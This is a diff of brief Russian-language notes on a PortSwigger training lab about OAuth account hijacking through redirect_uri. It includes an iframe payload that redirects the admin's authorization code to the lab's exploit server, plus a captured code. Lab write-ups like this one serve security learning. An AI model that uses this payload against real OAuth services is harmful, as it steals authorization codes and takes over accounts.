@@ -9,15 +9,14 @@
 -----
 лаба https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri
 # Захват учетной записи OAuth через redirect_uri
--------
+
+
 моя учетка `wiener:peter`.
 админ всегда в сети
 есть способ 100% воспроизвести эксплойт у админа
 нужно получить доступ у четке админа, украв его токен авторизации
 
 ---
-
-
 
 ```html
 <iframe src="https://oauth-0a1c007f036e578081cb23dd02c20007.oauth-server.net/auth?client_id=y9kiwsinntwb3b4ptrq0w&redirect_uri=https://exploit-0aeb0018038c576e810724c801640089.exploit-server.net/exploit/?t=1&response_type=code&scope=openid%20profile%20email"></iframe>
@@ -42,6 +41,7 @@ code=Ctt-pQxxgJiNJ-nUZV5_L0WH92agTJi3SuoIEDwSvrU.
 +
 ПОДМЕНИЛ редирект на СОБСТВЕННЫЙ хост 
 ```http
+
 redirect_uri=https://exploit-0aeb0018038c576e810724c801640089.exploit-server.net/?t=1
 ```
 t=1 - чтобы уникальный код получить
